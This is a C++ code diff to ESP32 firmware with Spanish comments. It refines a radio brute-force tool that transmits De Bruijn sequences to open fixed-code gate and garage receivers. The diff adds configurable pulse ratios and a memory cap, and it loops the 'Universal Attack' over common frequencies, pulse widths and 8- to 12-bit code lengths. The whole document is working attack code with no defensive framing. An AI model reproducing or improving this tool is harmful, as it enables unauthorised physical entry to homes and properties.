@@ -19,31 +19,25 @@ extern int anyAvailable();
 extern void clearBuffers();
 
 // --- CLASE GENÉRICA PARA MODO UNIVERSAL ---
-// Permite definir timings al vuelo sin crear un archivo .h
+// Permite definir timings y ratios al vuelo
 class protocol_dynamic : public c_rf_protocol {
 public:
-    protocol_dynamic(int te, int bit_len_mode = 0) {
-        // bit_len_mode: 0 = EV1527 (1:3 pwm), 1 = Linear (1:1 Manchester-ish / simple)
-        if (bit_len_mode == 0) {
-            // Standard PWM (1T High, 2T Low vs 2T High, 1T Low)
-            // Usamos positivo para HIGH, negativo para LOW (según sendPulse en v5.ino)
-            transposition_table['0'] = {te, -te * 3}; // Short High, Long Low (Generic)
-            transposition_table['1'] = {te * 3, -te}; // Long High, Short Low
-            // Pilot generico
-            pilot_period = {te, -te * 31}; 
-        } else {
-            // Otro modo si fuera necesario
-            transposition_table['0'] = {te, -te};
-            transposition_table['1'] = {te, -te * 2};
-            pilot_period = {};
-        }
+    protocol_dynamic(int te, int ratio = 3) {
+        // ratio: 2 (1:2 for old PT2262), 3 (1:3 for EV1527/Standard)
+        // Usamos positivo para HIGH, negativo para LOW
+        // 0 = Short High, Long Low
+        // 1 = Long High, Short Low
+        
+        int long_pulse = te * ratio;
+        int short_pulse = te;
+        
+        // GENERIC OOK MAPPING
+        transposition_table['0'] = {short_pulse, -long_pulse}; 
+        transposition_table['1'] = {long_pulse, -short_pulse};
+        
+        // Pilot: Usually 1T High, 31T Low (Standard)
+        pilot_period = {short_pulse, -te * 31}; 
         stop_bit = {};
-    }
-    
-    // Método para reconfigurar al vuelo si es necesario
-    void setTimings(int t_high0, int t_low0, int t_high1, int t_low1) {
-        transposition_table['0'] = {t_high0, -abs(t_low0)};
-        transposition_table['1'] = {t_high1, -abs(t_low1)};
     }
 };
 
@@ -51,10 +45,16 @@ public:
 
 std::vector<uint8_t> generateDeBruijn(int n) {
     std::vector<uint8_t> sequence;
-    if (n > 20) return sequence;
+    
+    // [SEGURIDAD MEMORIA ESP32 PICO D4]
+    // 16 bits = 65536 bytes de vector. 17 bits = 131KB (Peligro). 18 bits = CRASH.
+    // Con Bluetooth activado, el heap libre ronda los 100-150KB.
+    if (n > 16) {
+        dualPrintln("[!] ERROR: >16 bits excede la RAM del ESP32 con BT activo.");
+        return sequence;
+    }
 
     int total_unique = 1 << n;
-    // Calloc inicializa a 0
     uint8_t* visited = (uint8_t*)calloc(total_unique / 8 + 1, 1); 
     
     if (!visited) { dualPrintln("[!] Memoria insuficiente para De Bruijn."); return sequence; }
@@ -128,6 +128,8 @@ void sendDeBruijnSequence(c_rf_protocol* proto, const std::vector<uint8_t>& db_s
 void runDeBruijn(c_rf_protocol* proto, const char* name, int n, float freq, int repeats) {
     dualPrintf("\n[DeBruijn] Gen B(2, %d) para %s ... ", n, name);
     std::vector<uint8_t> seq = generateDeBruijn(n);
+    if (seq.empty()) return;
+
     dualPrintf("Len: %d bits\n", (int)seq.size());
     
     dualPrintf("[DeBruijn] TX @ %.2f MHz | Reps: %d\n", freq, repeats);
@@ -142,53 +144,51 @@ void runDeBruijn(c_rf_protocol* proto, const char* name, int n, float freq, int 
 void menuUniversalDeBruijn() {
     dualPrintln("\n==========================================");
     dualPrintln("   ULTIMATE UNIVERSAL DE BRUIJN SWEEP     ");
-    dualPrintln("   Covers: 99% Fixed Code Gates           ");
-    dualPrintln("   Note: This sequence takes time!        ");
+    dualPrintln("   [!] WARN: Rolling Code (HCS/Keeloq)    ");
+    dualPrintln("       will NOT open (Only Fixed/Clones)  ");
     dualPrintln("==========================================");
     
     // 1. FREQUENCIES (Most common first)
-    // 433.92 (EU/Global), 315.00 (USA/Asia), 868.35 (EU Secure), 
-    // 300/310/318/390 (USA Old/Genie/Linear)
     float freqs[] = {433.92, 315.00, 868.35, 300.00, 310.00, 318.00, 390.00, 433.42};
     
     // 2. TIMINGS (Pulse Width in us)
-    // 300us: Standard EV1527/China
-    // 200us: Fast systems
-    // 450us: Slower/Older systems (Linear/Came approx)
     int tes[] = {300, 200, 450}; 
     
+    // 3. RATIOS (PWM Pulse Relationship)
+    // 3 = 1:3 (EV1527 Standard)
+    // 2 = 1:2 (Old PT2262 / SMC)
+    int ratios[] = {3, 2};
+    
     // 3. BITS (Lengths)
-    // 12: The absolute standard for fixed code.
-    // 10: Multi-code / Linear / Dip-switch 10.
-    // 8:  Very old systems.
-    // (Note: 24-bit De Bruijn takes too long for a universal sweep -> ~1.5h per config)
-    int bits[] = {12, 10, 8};
+    int bits[] = {12, 10}; // Removed 8 to save time with new ratio loop
 
-    int total_configs = sizeof(freqs)/sizeof(float) * sizeof(tes)/sizeof(int) * sizeof(bits)/sizeof(int);
+    int total_configs = sizeof(freqs)/sizeof(float) * sizeof(tes)/sizeof(int) * sizeof(ratios)/sizeof(int) * sizeof(bits)/sizeof(int);
     int current_config = 0;
 
     for (float f : freqs) {
         for (int b : bits) {
             for (int t : tes) {
-                current_config++;
-                int status = checkPause();
-                if (status == 2) { dualPrintln("[!] Universal Attack CANCELLED."); return; }
-                if (status == 1) continue; // Skip
-
-                // Progress Info
-                dualPrintf("\n[%d/%d] Freq: %.2f | Bits: %d | Te: %dus\n", current_config, total_configs, f, b, t);
-                
-                // Configure generic protocol with current timing
-                protocol_dynamic dynProto(t); 
-                
-                // Run De Bruijn (Repeats reduced to 3 for speed in universal mode)
-                // Note: We generate the sequence fresh each time. 
-                // Optimization: Could cache the vector, but RAM is tight and generation is fast for <=12 bits.
-                std::vector<uint8_t> seq = generateDeBruijn(b);
-                setFrequencyCorrected(f);
-                sendDeBruijnSequence(&dynProto, seq, 3); // 3 Repeats
-                
-                yield(); // Prevent watchdog crash
+                for (int r : ratios) {
+                    current_config++;
+                    int status = checkPause();
+                    if (status == 2) { dualPrintln("[!] Universal Attack CANCELLED."); return; }
+                    if (status == 1) continue; // Skip
+    
+                    // Progress Info
+                    dualPrintf("\n[%d/%d] Freq: %.2f | Bits: %d | Te: %dus | Ratio 1:%d\n", current_config, total_configs, f, b, t, r);
+                    
+                    // Configure generic protocol with current timing AND ratio
+                    protocol_dynamic dynProto(t, r); 
+                    
+                    // Run De Bruijn (Repeats reduced to 3 for speed)
+                    std::vector<uint8_t> seq = generateDeBruijn(b);
+                    if (seq.empty()) continue; // Skip if generation failed (memory)
+                    
+                    setFrequencyCorrected(f);
+                    sendDeBruijnSequence(&dynProto, seq, 3); 
+                    
+                    yield(); // Prevent watchdog crash
+                }
             }
         }
     }
